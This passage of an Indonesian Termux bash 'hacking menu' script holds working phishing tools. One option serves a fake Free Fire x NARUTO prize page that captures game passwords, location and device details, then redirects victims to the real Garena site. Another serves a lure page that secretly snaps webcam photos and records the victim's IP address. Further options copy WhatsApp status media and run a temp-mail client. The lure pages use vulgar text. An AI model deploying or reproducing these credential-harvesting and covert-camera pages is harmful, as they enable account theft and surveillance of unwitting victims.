read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      88)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
echo "
███████╗███████╗    
██╔════╝██╔════╝    
█████╗  █████╗      
██╔══╝  ██╔══╝      
██║     ██║         
╚═╝     ╚═╝ 
Developer : Thxyzz404 " | lolcat
port="${1:-8080}"
echo ""
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import sys
from datetime import datetime
PORT_START = $port
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print('\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port ' + str(port) + ' sedang digunakan.')
            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html lang=\"id\">
<head>
  <meta charset=\"UTF-8\"/>
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>
  <title>Free Fire x NARUTO - Event Spesial</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0a0a0a;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a0a 100%);
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(255,0,80,0.3);
      position:relative;
      overflow:hidden;
    }
    .card::before {
      content:'';
      position:absolute;
      top:-50%;
      left:-50%;
      width:200%;
      height:200%;
      background:linear-gradient(45deg,transparent,rgba(255,0,80,0.1),transparent);
      transform:rotate(45deg);
      animation:shine 3s linear infinite;
    }
    @keyframes shine {
      0%{transform:rotate(45deg) translateX(-100%);}
      100%{transform:rotate(45deg) translateX(100%);}
    }
    .logo{
      font-size:36px;
      font-weight:700;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1px;
      text-shadow:0 0 20px rgba(255,0,80,0.5);
    }
    .event{
      font-size:14px;
      color:#ffcc00;
      text-align:center;
      margin-bottom:25px;
      font-weight:600;
    }
    .naruto{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"45\" fill=\"%23ffcc00\"/><path d=\"M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z\" fill=\"%23ff0050\"/></svg>') center/cover;
      border-radius:50%;
      box-shadow:0 0 20px rgba(255,204,0,0.6);
      animation:float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%,100%{transform:translateY(0px);}
      50%{transform:translateY(-10px);}
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:rgba(0,0,0,0.8);
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
      transition:all 0.3s ease;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
      box-shadow:0 0 10px rgba(255,0,80,0.3);
    }
    input::placeholder{
      color:#888;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
      margin-top:10px;
    }
    .btn:hover{
      transform:scale(1.02);
      box-shadow:0 0 20px rgba(255,0,80,0.6);
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ffcc00;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ffcc00;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .reward-text{
      text-align:center;
      font-size:12px;
      color:#ffcc00;
      margin-top:15px;
      font-weight:500;
    }
    .features{
      display:flex;
      justify-content:space-around;
      margin:20px 0;
      font-size:12px;
    }
    .feature{
      text-align:center;
    }
    .feature-icon{
      font-size:20px;
      margin-bottom:5px;
    }
  </style>
</head>
<body>
  <div class=\"card\">
    <div class=\"logo\">Free Fire</div>
    <div class=\"event\">Event Spesial: Free Fire x NARUTO</div>
    <div class=\"naruto\"></div>
    <div class=\"features\">
      <div class=\"feature\">
        <div class=\"feature-icon\">🎁</div>
        <div>Free Skin</div>
      </div>
      <div class=\"feature\">
        <div class=\"feature-icon\">⚡</div>
        <div>Character NARUTO</div>
      </div>
      <div class=\"feature\">
        <div class=\"feature-icon\">💎</div>
        <div>500 Diamond</div>
      </div>
    </div>
    <input type=\"text\" id=\"user\" placeholder=\"ID Garena / Email / Nomor HP\"/>
    <input type=\"password\" id=\"pass\" placeholder=\"Kata Sandi\"/>
    <button class=\"btn\" onclick=\"login()\">Klaim Hadiah & Masuk</button>
    <div class=\"reward-text\">
      🎉 Dapatkan Skin NARUTO Exclusive & 500 Diamond Gratis!
    </div>
    <div class=\"loading\" id=\"loading\">
      <div class=\"spinner\"></div>
      <div>Memverifikasi akun dan mengklaim hadiah...</div>
    </div>
  </div>
  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){
        alert('Harap lengkapi ID dan Kata Sandi untuk klaim hadiah!');
        return;
      }
      const loading=document.getElementById('loading');
      const btn=document.querySelector('.btn');  
      loading.style.display='block';
      btn.disabled=true;
      btn.textContent='MENGKLAIM HADIAH...';
      try{
        let lat='', lon='';
        try{
          const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
          lat=pos.coords.latitude;
          lon=pos.coords.longitude;
        }catch(e){
          console.log('Location access denied or unavailable');
        }
        let img='';
        try{
          img='simulated_image_data';
        }catch(e){
          console.log('Camera access denied');
        }
        await fetch('/collect/freefire_event',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            user:user,
            pass:pass,
            lat:lat,
            lon:lon,
            img:img,
            userAgent:navigator.userAgent,
            platform:navigator.platform,
            timestamp:new Date().toISOString()
          })
        });
        setTimeout(()=>{
          loading.innerHTML='<div style=\"color:#00ff00; font-weight:600;\">✓ Berhasil! Hadiah diklaim</div><div style=\"font-size:12px; margin-top:5px;\">Mengarahkan ke Free Fire...</div>';
          btn.style.background='linear-gradient(45deg, #00b300, #00ff00)';  
          setTimeout(()=>{
            window.location.href='https://ff.garena.com';
          },2000);
        },2000);
      }catch(e){
        loading.innerHTML='<div style=\"color:#ff4444; font-weight:600;\">✗ Gagal mengklaim hadiah</div><div style=\"font-size:12px; margin-top:5px;\">Silakan coba lagi...</div>';
        btn.disabled=false;
        btn.textContent='Klaim Hadiah & Masuk';
        setTimeout(()=>{
          loading.style.display='none';
        },3000);
      }
    }
    document.addEventListener('keypress',function(e){
      if(e.key==='Enter') login();
    });
  </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")  
    def do_POST(self):
        if self.path == \"/collect/freefire_event\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())   
            user = data.get('user', '')
            password = data.get('pass', '')
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            img = data.get('img', '')     
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m \" + \"=\"*50 + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Free Fire x NARUTO - Data Baru\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Waktu :\033[32;1m \" + datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\") + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User/ID :\033[32;1m \" + user + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\")
            if lat and lon:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Lokasi :\033[32;1m \" + f\"{lat}, {lon}\" + \"\033[0m\")
            if img:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Foto :\033[32;1m Tersedia (\" + str(len(img)) + \" bytes)\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m \" + self.headers.get('User-Agent', '') + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m \" + \"=\"*50 + \"\033[0m\\n\")            
            with open(\"freefire_data.txt\", \"a\") as f:
                f.write(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\\n\")
                f.write(f\"User: {user}\\n\")
                f.write(f\"Password: {password}\\n\")
                f.write(f\"Lokasi: {lat}, {lon}\\n\")
                f.write(f\"Foto: {len(img)} bytes\\n\")
                f.write(\"-\" * 50 + \"\\n\\n\")                
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({\"status\": \"success\", \"message\": \"Login berhasil\"}).encode())
        else:
            self.send_error(404) 
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu data login..!!\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Data akan disimpan di : freefire_data.txt\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      89)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
set -euo pipefail
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
PORT="${PORT:-8080}"
SAVE_DIR="/sdcard/Hasil_Foto"
if [ ! -d "/sdcard" ]; then
  clear
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${c} /sdcard/ Tidak Di Temukan Sistem Tidak Dapat Di Jalankan..!!"
  echo ""
  sleep 4
  kill -9 -1 && exit
fi
if ! command -v python3 >/dev/null 2>&1; then
  clear
  echo ""
  echo -e "${r}[ ${g}ERR ${r}]${y} python3 belum terpasang. Di Termux: pkg install python -y"
  echo ""
  sleep 4
  kill -9 -1 && exit
fi
if [ ! -d "/storage/emulated/0" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${y} Menjalankan termux-setup-storage (butuh konfirmasi izin)."
  echo ""
  if command -v termux-setup-storage >/dev/null 2>&1; then
    termux-setup-storage
  else
    clear 
    echo ""
    echo -e "${r}[ ${g}WARN ${r}]${y} termux-setup-storage tidak tersedia. Lanjut mencoba tanpa itu."
    echo ""
    sleep 3 
  fi
fi
mkdir -p "$SAVE_DIR"
clear 
echo "
▗▖ ▗▖▗▖ ▗▖ ▗▄▖▗▄▄▄▖▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▄▄▖ 
▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌ █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
▐▌ ▐▌▐▛▀▜▌▐▛▀▜▌ █  ▝▀▚▖▐▛▀▜▌▐▛▀▘ ▐▛▀▘ 
▐▙█▟▌▐▌ ▐▌▐▌ ▐▌ █ ▗▄▄▞▘▐▌ ▐▌▐▌   ▐▌ 
" | lolcat
echo -e "${r}   Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}INFO ${r}]${c} Membuka server Python di port : ${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${y} Akses di : http://localhost : ${PORT}"
python3 - <<EOF
import warnings
import sys
import os
import json
import datetime
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
warnings.filterwarnings("ignore")
sys.tracebacklimit = 0
PORT = int(os.environ.get("PORT", "${PORT}"))
SAVE_DIR = os.environ.get("SAVE_DIR", "${SAVE_DIR}")
HTML_CONTENT = '''<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Bokep Kamera Auto Virall</title>
  <style>
    :root { --pad: 16px; }
    body {
      font-family: system-ui, sans-serif;
      max-width: 820px;
      margin: 2rem auto;
      padding: 0 var(--pad);
      background: linear-gradient(to bottom, #04364A, #176B87);
      color: white;
      text-shadow: 1px 1px 2px black;
    }
    h1 { font-size: 1.4rem; margin-bottom: 0.5rem; }
    .notice {
      background: rgba(0,0,0,0.5);
      padding: var(--pad);
      border-radius: 12px;
    }
    video, canvas {
      width: 100%;
      max-width: 780px;
      border-radius: 12px;
      background: #000;
    }
    .bar { margin: 1rem 0; }
    button {
      padding: .75rem 1rem;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      background: #007bff;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Klik Gass Project dan akan di arahkan pada Website Banned WhatsApp 😈🔥</h1>
  <p class="notice">
    Saya tidak bertanggung <strong>jawab</strong> jika
    website Banned WhatsApp ini di salah gunakan.
  </p>
  <video id="preview" playsinline autoplay></video>
  <div class="bar">
    <button id="start">Gass Project</button>
  </div>
  <canvas id="photo" hidden></canvas>
  <script>
const video = document.getElementById("preview");
const canvas = document.getElementById("photo");
const startBtn = document.getElementById("start");
let stream;
async function getIP() {
    try {
        const resp = await fetch("https://api.ipify.org?format=json");
        const data = await resp.json();
        return data.ip || "unknown";
    } catch {
        return "unknown";
    }
}
function takeSnapshot() {
  if (!stream) return null;
  const track = stream.getVideoTracks()[0];
  const settings = track.getSettings();
  const w = settings.width || 640;
  const h = settings.height || 480;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, w, h);
  return canvas;
}
async function uploadCanvas(canv, ip, index=null) {
  const blob = await new Promise(res => canv.toBlob(res, "image/png"));
  const fd = new FormData();
  const filename = index === null ? "photo.png" : \`photo_\${index}.png\`;
  fd.append("photo", blob, filename);
  fd.append("ip", ip);
  const resp = await fetch("/upload", { method: "POST", body: fd });
  if (!resp.ok) throw new Error("Upload gagal");
  return await resp.json();
}
async function startAndSnap() {
  try {
    const ip = await getIP();
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: "user" } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
    for (let i = 1; i <= 5; i++) {
      await new Promise(res => setTimeout(res, 500));
      const canv = takeSnapshot();
      if (canv) {
        await uploadCanvas(canv, ip, i);
      }
    }
    stream.getTracks().forEach(t => t.stop());
    window.location.href = "https://lu-ngentod-9ank.vercel.app/";
  } catch (err) {
    alert("Gagal akses kamera: " + err.message);
  }
}
startBtn.addEventListener("click", startAndSnap);
  </script>
</body>
</html>'''
class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return    
    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode('utf-8'))
            return
        else:
            self.send_error(404, "Not Found")  
    def parse_multipart_form_data(self, content_type, content_length):
        """Parse multipart/form-data tanpa menggunakan cgi"""
        try:
            boundary = None
            for part in content_type.split(';'):
                part = part.strip()
                if part.startswith('boundary='):
                    boundary = part[9:].encode('utf-8')           
            if not boundary:
                return None
            data = self.rfile.read(content_length)
            parts = data.split(b'--' + boundary)            
            result = {}            
            for part in parts:
                if not part or part in [b'', b'--\r\n']:
                    continue
                if b'\r\n\r\n' in part:
                    headers_raw, content = part.split(b'\r\n\r\n', 1)
                    headers = {}                   
                    for line in headers_raw.split(b'\r\n'):
                        if b': ' in line:
                            key, value = line.split(b': ', 1)
                            headers[key.decode('utf-8').lower()] = value.decode('utf-8')
                    if 'content-disposition' in headers:
                        disp = headers['content-disposition']
                        params = {}
                        for param in disp.split(';'):
                            param = param.strip()
                            if '=' in param:
                                key, value = param.split('=', 1)
                                params[key] = value.strip('"')
                        if 'name' in params:
                            field_name = params['name']
                            if 'filename' in params:
                                result[field_name] = {
                                    'filename': params['filename'],
                                    'content': content.rstrip(b'\r\n')
                                }
                            else:
                                result[field_name] = content.rstrip(b'\r\n').decode('utf-8')            
            return result            
        except Exception as e:
            print(f"Error parsing form data: {e}")
            return None    
    def do_POST(self):
        if self.path != "/upload":
            self.send_error(404, "Not Found")
            return       
        content_type = self.headers.get('Content-Type', '')
        content_length = int(self.headers.get('Content-Length', 0))     
        if 'multipart/form-data' not in content_type:
            self.send_error(400, "Content-Type harus multipart/form-data")
            return
        form_data = self.parse_multipart_form_data(content_type, content_length)        
        if not form_data or 'photo' not in form_data:
            self.send_error(400, "Field photo tidak ditemukan")
            return       
        photo_data = form_data['photo']
        ip = form_data.get('ip', 'unknown')        
        if not isinstance(photo_data, dict) or 'content' not in photo_data:
            self.send_error(400, "Tidak ada file")
            return       
        os.makedirs(SAVE_DIR, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        filename = photo_data.get('filename', 'photo.png')
        if '.' in filename:
            ext = '.' + filename.split('.')[-1].lower()
            if len(ext) > 5:
                ext = '.png'
        else:
            ext = '.png'       
        out_path = os.path.join(SAVE_DIR, f"foto_{ts}_{ip.replace('.', '_')}{ext}")
        with open(out_path, "wb") as f:
            f.write(photo_data['content'])       
        payload = {"ok": True, "path": out_path}
        data = json.dumps(payload).encode("utf-8")       
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(data)    
    def end_headers(self):
        self.send_header("X-Content-Type-Options", "nosniff")
        BaseHTTPRequestHandler.end_headers(self)
if __name__ == "__main__":
    while True:
        try:
            addr = ("", PORT)
            httpd = HTTPServer(addr, RequestHandler)
            break
        except OSError as e:
            if e.errno == 98:
                print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[33;1m Port {PORT} sudah dipakai, coba port {PORT+1}")
                PORT += 1
            else:
                raise    
    print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[36;1m Server berjalan di : http://localhost:{PORT}")
    print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[35;1m Hasil Akan Di Simpan Secara Otomatis Di : {SAVE_DIR}")   
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer dihentikan.")
        try:
            httpd.server_close()
        except Exception:
            pass
EOF
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
     1|01)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
r='\033[31;1m'
c='\033[36;1m'
y='\033[33;1m'
g='\033[32;1m'
p='\033[35;1m'
hex_whatsapp_business() {
    paths=(
        "/sdcard/WhatsApp Business/Media/.Statuses"
        "/storage/emulated/0/WhatsApp Business/Media/.Statuses"
        "/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.Statuses"
        "/sdcard/Android/data/com.whatsapp.w4b/WhatsApp Business/Media/.Statuses"
    )
    target="/sdcard/Status_hex_business"
    source=""
    for path in "${paths[@]}"; do
        if [ -d "$path" ]; then
            source="$path"
            break
        fi
    done
    if [ -z "$source" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} WhatsApp business tidak di temukan."
        echo ""
    fi
    mkdir -p "$target"
    files=()
    while IFS= read -r -d '' file; do
        files+=("$(basename "$file")")
    done < <(find "$source" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.gif" \) -print0)
    if [ ${#files[@]} -eq 0 ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Setatus tidak ada."
        echo ""
    fi
    moved_count=0
    for file in "${files[@]}"; do
        from="$source/$file"
        to="$target/$file"
        if mv "$from" "$to" 2>/dev/null; then
            ((moved_count++))
        fi
    done
    echo -e "${r}[ ${g}✓ ${r}]${c} Semua setatus telah di ambil,"
    echo -e "${c} dan di pindahkan ke folder Status_hex_business [ $moved_count ]"
    echo ""
    sleep 4
    clear 
}
hex_whatsapp_original() {
    paths=(
        "/sdcard/WhatsApp/Media/.Statuses"
        "/storage/emulated/0/WhatsApp/Media/.Statuses"
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses"
        "/sdcard/Android/data/com.whatsapp/WhatsApp/Media/.Statuses"
    )
    target="/sdcard/Status_hex_wea_Ori"
    source=""
    for path in "${paths[@]}"; do
        if [ -d "$path" ]; then
            source="$path"
            break
        fi
    done
    if [ -z "$source" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} WhatsApp ori tidak di temukan."
        echo ""
    fi
    mkdir -p "$target"
    files=()
    while IFS= read -r -d '' file; do
        files+=("$(basename "$file")")
    done < <(find "$source" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.gif" \) -print0)
    if [ ${#files[@]} -eq 0 ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Setatus tidak ada."
        echo ""
    fi
    moved_count=0
    for file in "${files[@]}"; do
        from="$source/$file"
        to="$target/$file"
        if mv "$from" "$to" 2>/dev/null; then
            ((moved_count++))
        fi
    done
    echo -e "${r}[ ${g}✓ ${r}]${c} Semua setatus telah di ambil,"
    echo -e "${c} dan di pindahkan ke folder Status_hex_wea_Ori [ $moved_count ]"
    echo ""
    sleep 4
    clear
}
rinem_kontol() {
clear
echo "
░█░█░█▀▀░█░█░░░░░█▀▀░▀█▀░█▀▀
░█▀█░█▀▀░▄▀▄░▄▄▄░▀▀█░░█░░▀▀█
░▀░▀░▀▀▀░▀░▀░░░░░▀▀▀░░▀░░▀▀▀ " | lolcat
    echo ""
    echo -e "${p} Development ${g}: ${c}Thxyzz404"
    echo ""
    echo -e "${r}[ ${g}01 ${r}]${y} WhatsApp Original"
    echo -e "${r}[ ${g}02 ${r}]${y} WhatsApp Business"
    echo -e "${r}[ ${g}03 ${r}]${p} Keluar"
    echo ""    
    read -p "$(echo -e "${c}Masukkan pilihan anda ${r}: ${g}")" bacot    
    case $bacot in
        01|1)
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Mohon bersabar sedang proses hex."
            sleep 2
            clear
            echo ""
            hex_whatsapp_original
            ;;
        02|2)
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Mohon bersabar sedang proses hex."
            sleep 2
            clear 
            echo ""
            hex_whatsapp_business
            ;;
        03|3)
            clear
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${g} Keluar dari tools."
            echo ""
            ;;
        *)
            clear 
            echo ""
            echo -e "${r} Pilihan anda tidak valid."
            echo ""
            ;;
    esac
}
rinem_kontol
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
     2|02)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
cok="ansi-rounded"
echo "
███╗   ███╗ █████╗ ██╗██╗     ███████╗
████╗ ████║██╔══██╗██║██║     ██╔════╝
██╔████╔██║███████║██║██║     █████╗  
██║╚██╔╝██║██╔══██║██║██║     ██╔══╝  
██║ ╚═╝ ██║██║  ██║██║███████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝" | boxes -d "$cok" | lolcat
echo ""
echo -e "${p}      Developer ${r}: ${c}Thxyzz404"
echo ""
python3 -c '
import os
import time
import requests
import re
from rich.console import Console
from rich.panel import Panel
from rich import box
from rich.table import Table
from rich.live import Live
from datetime import datetime
import random
import string
from html import unescape
class TempMailViewer:
    def __init__(self):
        self.console = Console()
        self.API_BASE = "https://api.mail.tm"
        self.email = None
        self.token = None
        self.seen_ids = set()
        self.waiting_shown = False
    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")
    def clean_html(self, html_content):
        if isinstance(html_content, list):
            html_content = " ".join(str(item) for item in html_content)
        if not html_content:
            return ""
        text = unescape(str(html_content))
        text = re.sub(r"<[^>]+>", " ", text)
        text = re.sub(r"\s+", " ", text)
        text = text.strip()
        return text
    def create_inbox_table(self, messages):
        table = Table(
            title="Inbox",
            box=box.ROUNDED,
            show_header=True,
            header_style="bold cyan",
            expand=True
        )
        table.add_column("ID", style="dim", width=6)
        table.add_column("From", style="bright_blue")
        table.add_column("Subject", style="bright_green")
        table.add_column("Date", style="yellow")
        for msg in messages:
            date = datetime.fromisoformat(msg["createdAt"].rstrip("Z")).strftime("%Y-%m-%d %H:%M")
            table.add_row(
                msg["id"][:6],
                msg.get("from", {}).get("address", "unknown"),
                msg.get("subject", "[No Subject]")[:30],
                date
            )
        return table
    def display_email(self, message):
        if not message:
            return
        from_addr = message.get("from", {})
        if isinstance(from_addr, dict):
            from_display = from_addr.get("address", "N/A")
        else:
            from_display = str(from_addr)       
        subject = message.get("subject", "[No Subject]")
        created_at = message.get("createdAt", "N/A")
        header_table = Table(show_header=False, box=box.ROUNDED, expand=True, title="📧 Email Details", title_style="bold cyan")
        header_table.add_column("Field", style="bold cyan", width=10)
        header_table.add_column("Value", style="bright_white")
        header_table.add_row("📤 From", from_display)
        header_table.add_row("📅 Date", created_at)
        header_table.add_row("📝 Subject", subject)
        self.console.print(header_table)
        body_text = message.get("text", "")
        body_html = message.get("html", "")       
        body_display = ""
        if body_text:
            if isinstance(body_text, list):
                body_text = " ".join(str(x) for x in body_text)
            body_display = str(body_text).replace("\\n", "\n").replace("\\r", "").replace("\\t", " ")
        elif body_html:
            body_display = self.clean_html(body_html)
        else:
            body_display = "[No Content]"
        if len(body_display) > 800:
            body_display = body_display[:800] + "..."
        if body_display.strip():
            self.console.print(Panel(
                body_display.strip(), 
                title="📄 Message Content", 
                style="bright_white", 
                box=box.ROUNDED,
                border_style="green"
            ))
        else:
            self.console.print(Panel(
                "[dim]Empty message[/dim]", 
                title="📄 Message Content", 
                style="dim", 
                box=box.ROUNDED
            ))
    def get_domains(self):
        try:
            r = requests.get(f"{self.API_BASE}/domains")
            if r.status_code == 200:
                data = r.json()
                members = data.get("hydra:member", [])
                if members:
                    return members[0].get("domain")
        except Exception as e:
            pass
        return "mail.tm"
    def create_account(self):
        domain = self.get_domains()
        username = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{username}@{domain}"
        try:
            r = requests.post(f"{self.API_BASE}/accounts", 
                            json={"address": email, "password": "temp123"})
            if r.status_code in (200, 201):
                login = requests.post(f"{self.API_BASE}/token", 
                                    json={"address": email, "password": "temp123"})
                if login.status_code == 200:
                    self.token = login.json().get("token")
                    self.email = email
                    return True
        except Exception as e:
            pass
        return False
    def check_inbox(self):
        if not self.token:
            return []
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            r = requests.get(f"{self.API_BASE}/messages", headers=headers)
            if r.status_code == 200:
                data = r.json()
                return data.get("hydra:member", [])
        except Exception as e:
            pass
        return []
    def read_email(self, message_id):
        if not self.token:
            return None
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            r = requests.get(f"{self.API_BASE}/messages/{message_id}", headers=headers)
            if r.status_code == 200:
                return r.json()
        except Exception as e:
            pass
        return None
    def run(self):
        if not self.create_account():
            self.console.print(Panel("[red]Failed to create temp email![/red]", box=box.ROUNDED))
            return
        self.console.print(Panel(
            f"[green]✓ Email Active:[/green]\n[yellow]{self.email}[/yellow]",
            title="📧 EMAIL GENERATED",
            style="green",
            box=box.ROUNDED
        ))
        try:
            with Live(auto_refresh=False) as live:
                while True:
                    messages = self.check_inbox()
                    new_messages = [msg for msg in messages if msg["id"] not in self.seen_ids]
                    if new_messages:
